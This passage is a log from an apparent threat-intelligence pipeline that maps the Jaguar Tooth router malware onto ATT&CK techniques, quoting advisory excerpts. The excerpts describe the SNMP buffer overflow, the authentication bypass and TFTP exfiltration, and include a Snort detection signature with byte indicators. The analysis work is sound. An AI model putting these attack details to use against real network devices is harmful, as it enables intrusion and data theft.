[2025-04-08 17:45:37,454 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories]: tensor([[0.2490]])
[2025-04-08 17:45:37,613 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: confluence]: tensor([[0.2713]])
[2025-04-08 17:45:37,799 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: sharepoint]: tensor([[0.2593]])
[2025-04-08 17:45:37,958 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: code repositories]: tensor([[0.2147]])
[2025-04-08 17:45:38,101 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: customer relationship management software]: tensor([[0.1785]])
[2025-04-08 17:45:38,240 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: messaging applications]: tensor([[0.2733]])
[2025-04-08 17:45:38,322 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from local system]: tensor([[0.4012]])
[2025-04-08 17:45:38,404 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from network shared drive]: tensor([[0.3533]])
[2025-04-08 17:45:38,567 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from removable media]: tensor([[0.3464]])
[2025-04-08 17:45:38,757 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data staged]: tensor([[0.3040]])
[2025-04-08 17:45:38,936 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data staged: local data staging]: tensor([[0.2989]])
[2025-04-08 17:45:39,068 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data staged: remote data staging]: tensor([[0.2891]])
[2025-04-08 17:45:39,147 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection]: tensor([[0.0873]])
[2025-04-08 17:45:39,215 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection: local email collection]: tensor([[0.1871]])
[2025-04-08 17:45:39,301 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection: remote email collection]: tensor([[0.1122]])
[2025-04-08 17:45:39,425 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection: email forwarding rule]: tensor([[0.0538]])
[2025-04-08 17:45:39,526 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture]: tensor([[0.1973]])
[2025-04-08 17:45:39,627 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: keylogging]: tensor([[0.2550]])
[2025-04-08 17:45:39,728 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: gui input capture]: tensor([[0.2662]])
[2025-04-08 17:45:39,829 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: web portal capture]: tensor([[0.3149]])
[2025-04-08 17:45:39,925 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: credential api hooking]: tensor([[0.2713]])
[2025-04-08 17:45:40,021 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [screen capture]: tensor([[0.2556]])
[2025-04-08 17:45:40,109 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [video capture]: tensor([[0.2131]])
[2025-04-08 17:45:40,119 INFO] ++ Scores: [('data from configuration repository: network device configuration dump', tensor([[0.7073]])), ('data from configuration repository', tensor([[0.4489]])), ('data from configuration repository: snmp (mib dump)', tensor([[0.4320]])), ('data from local system', tensor([[0.4012]])), ('clipboard data', tensor([[0.3548]]))]
[2025-04-08 17:45:40,119 INFO] ++ Similar techniques found:
['data from configuration repository: network device configuration dump', 'data from configuration repository', 'data from configuration repository: snmp (mib dump)', 'data from local system', 'clipboard data']
[2025-04-08 17:45:40,120 INFO] ++ Querying the QA model for action Data from Configuration Repository: Network Device Configuration Dump as used by the malware with the following context:
data from configuration repository: network device configuration dump
data from configuration repository
data from configuration repository: snmp (mib dump)
data from local system
clipboard data
[2025-04-08 17:45:41,213 INFO] ++ QA suggested technique: data from configuration repository: network device configuration dump
[2025-04-08 17:45:41,214 INFO] ++ Selected technique: data from configuration repository: network device configuration dump
[2025-04-08 17:45:44,824 INFO] ++ Refining the action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9f0df71b-f594-455a-8dd0-8e20bde92d87', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='MITRE ATT&CK® \nThis report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible \nknowledge base of adversary tactics and techniques based on real -world observations.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='It defines a message format for communication between SNMP managers and agents.An SNMP agent gathers data from the SNMP MIB, which is the repository of information about device parameters and network data.\n\nIt also responds to requests from an SNMP manager to get or set data.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims.SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network.A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks.Weak SNMP community strings, including the default "public," allowed APT28 to gain access to router information.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy -to-guess community strings, can \nmake a network susceptible to attacks.\n\nWeak SNMP community strings, including the default “ public ,” allowed APT28 to \ngain access to router information.\n\nAPT28 sent additional SNMP commands to enumerate router interfaces.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='While SNMP is still widely used for its simplicity and compatibility with older network devices, the security benefits of NETCONF and RESTCONF make them more suitable for modern network management.When you consider the security of a network device, it is critical that the management plane be protected.')]
[2025-04-08 17:46:05,477 INFO] ++ Pre-conditions computed for action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware using 9 documents:
[Document(id='7ce50e75-f4d6-4e1e-acdb-a0efddbf862b', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(id='64ae615b-bf4f-4d89-825f-249570e863cf', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - CiscoSkip to contentSkip to searchSkip to footerCisco.com WorldwideProducts and ServicesSolutionsSupportLearnExplore CiscoHow to BuyPartners HomePartner ProgramSupportToolsFind a Cisco PartnerMeet our PartnersBecome a Cisco PartnerSupportProduct SupportSNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE SoftwareSaveLog into Save ContentTranslationsPrintAvailable LanguagesUpdated:April 21, 2023Document ID:1498756426900165Bias-Free LanguageBias-Free LanguageThe documentation set for this product strives to use bias-free language.'), Document(id='c0c7f06f-c207-4397-a3d7-de46197789e4', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England DigitalSkip to main contentEnglandDigitalClose menuServicesDataCyberDeveloperNewsAboutMenuSearchClose searchNHS DigitalCyber alerts2023CC-4303State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco RoutersThe UK National Cyber Security Centre (NCSC) along with the United States FBI, NSA and CISA have released a joint advisory describing a 2021 campaign exploiting a known SNMP vulnerability in Cisco IOS and Cisco IOS XE.Threat ID:CC-4303Threat Severity:MediumPublished:19 April 2023 4:38 PMReport a cyber attack: call0300 303 5222or email[email\xa0protected]Page contentsSummaryAffected platformsRemediation adviceDefinitive source of threat updatesCVE VulnerabilitiesSummaryThe UK National Cyber Security Centre (NCSC) along with the United States FBI, NSA and CISA have released a joint advisory describing a 2021 campaign exploiting a known SNMP vulnerability in Cisco IOS and Cisco IOS XE.Affected platformsThe following platforms are known to be affected:Cisco IOSCisco IOS XEThreat detailsIntroductionThe UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal Bureau of Investigation (FBI) have released a joint advisory describing how state-sponsored threat actors (commonly tracked as APT28) successfully exploited Cisco routers during a 2021 campaign using a known Simple Network Management Protocol (SNMP)vulnerability(CVE-2017-6742).CVE-2017-6742 was first disclosed in a Cisco security advisory in June 2017 and relates to abuffer overflowcondition in the SNMP subsystem.'), Document(id='0ee42b9c-0da5-423f-b159-900ed640da0e', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='This malware obtains further device information which is then exfiltrated over trivial file transfer protocol (TFTP) and enables unauthenticated access via a backdoor.The NCSC have attributed the campaign to APT28, whom they assess as "almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165."'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6.\n\nOnly traffic directed to the affected system can be used to exploit these vulnerabilities.To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.')]
[2025-04-08 17:46:19,671 INFO] ++ Post-conditions computed for action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.')]
[2025-04-08 17:46:28,035 INFO] ++ Indicators computed for action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware. The indicators are:
['The content " | 2 b   0 6   0 1   0 4   0 1   0 9   0 9   5 f   0 1   0 2   0 4   0 1   0 3 |" is transmitted.', 'The content "| 0 3   8 1   6 0   0 0   0 8 |" is transmitted.', 'The content "| 2 4   0 2   0 0   0 1 |" is transmitted.']
[2025-04-08 17:46:28,253 INFO] ++ Removed pre-condition: 
A Cisco IOS device with a running configuration.
, due to similarity with: 
The target device is running Cisco IOS software.
 (tensor([[0.7325]]))
[2025-04-08 17:46:28,941 INFO] ++ Removed pre-condition: 
The malware capable of executing Cisco IOS CLI commands.
, due to similarity with: 
The malware has access to the target device's command line interface (CLI).
 (tensor([[0.7110]]))
[2025-04-08 17:46:58,899 INFO] Processing step relative to tactic: exfiltration
[2025-04-08 17:46:58,899 INFO] + Processing action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware
[2025-04-08 17:46:59,158 INFO] ++ Embedding computed for: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware. The vector has shape: (384,)
[2025-04-08 17:46:59,288 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [automated exfiltration]: tensor([[0.6720]])
[2025-04-08 17:46:59,430 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [automated exfiltration: traffic duplication]: tensor([[0.5545]])
[2025-04-08 17:46:59,607 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [data transfer size limits]: tensor([[0.4748]])
[2025-04-08 17:46:59,802 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol]: tensor([[0.7126]])
[2025-04-08 17:47:00,011 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol]: tensor([[0.7525]])
[2025-04-08 17:47:00,137 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol]: tensor([[0.7536]])
[2025-04-08 17:47:00,208 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol]: tensor([[0.7716]])
[2025-04-08 17:47:00,290 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over c2 channel]: tensor([[0.6529]])
[2025-04-08 17:47:00,379 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over other network medium]: tensor([[0.6107]])
[2025-04-08 17:47:00,470 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over other network medium: exfiltration over bluetooth]: tensor([[0.6696]])
[2025-04-08 17:47:00,662 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over physical medium]: tensor([[0.5835]])
[2025-04-08 17:47:00,847 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over physical medium: exfiltration over usb]: tensor([[0.6027]])
[2025-04-08 17:47:00,945 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service]: tensor([[0.5412]])
[2025-04-08 17:47:01,069 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration to code repository]: tensor([[0.4952]])
[2025-04-08 17:47:01,200 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration to cloud storage]: tensor([[0.5218]])
[2025-04-08 17:47:01,323 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration to text storage sites]: tensor([[0.5550]])
[2025-04-08 17:47:01,520 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration over webhook]: tensor([[0.4982]])
[2025-04-08 17:47:01,766 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [scheduled transfer]: tensor([[0.5242]])
[2025-04-08 17:47:01,978 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [transfer data to cloud account]: tensor([[0.3021]])
[2025-04-08 17:47:01,983 INFO] ++ Scores: [('exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', tensor([[0.7716]])), ('exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol', tensor([[0.7536]])), ('exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol', tensor([[0.7525]])), ('exfiltration over alternative protocol', tensor([[0.7126]])), ('automated exfiltration', tensor([[0.6720]]))]
[2025-04-08 17:47:01,983 INFO] ++ Similar techniques found:
['exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', 'exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol', 'exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol', 'exfiltration over alternative protocol', 'automated exfiltration']
[2025-04-08 17:47:01,984 INFO] ++ Querying the QA model for action Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware with the following context:
exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol
exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol
exfiltration over alternative protocol
automated exfiltration
[2025-04-08 17:47:03,557 INFO] ++ QA suggested technique: exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
[2025-04-08 17:47:03,557 INFO] ++ Selected technique: exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
[2025-04-08 17:47:07,053 INFO] ++ Refining the action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Initial Access  T1190  Exploit Public -Facing \nApplication  Jaguar Tooth is deployed  via an \nSNMP exploit which grant s \nremote code execution and \nwrite -access to the target \noperating syste m. \n \nExfiltration  T1048.003  Exfiltration Over \nAlternative Protocol :  \nExfiltration Over \nUnencrypted Non -C2 \nProtocol  \n Jaguar Tooth exfiltrates \ncollected device information  over \nTFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='Malware Deployment  \nFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’s Jaguar Tooth Malware Analysis Report\n.\n\nThis \nmalware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='It defines a message format for communication between SNMP managers and agents.An SNMP agent gathers data from the SNMP MIB, which is the repository of information about device parameters and network data.\n\nIt also responds to requests from an SNMP manager to get or set data.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Designed to prevent unauthorized direct communication to network devices, infrastructure access control lists (iACLs) are one of the most critical security controls that can be implemented in networks.Details on how customers can apply mitigations and disable the affected MIBs are available in thesecurity advisory.Cisco Talos provided additional details about this specific campaign as well as observations of a larger issue of which this campaign is an example – a rising 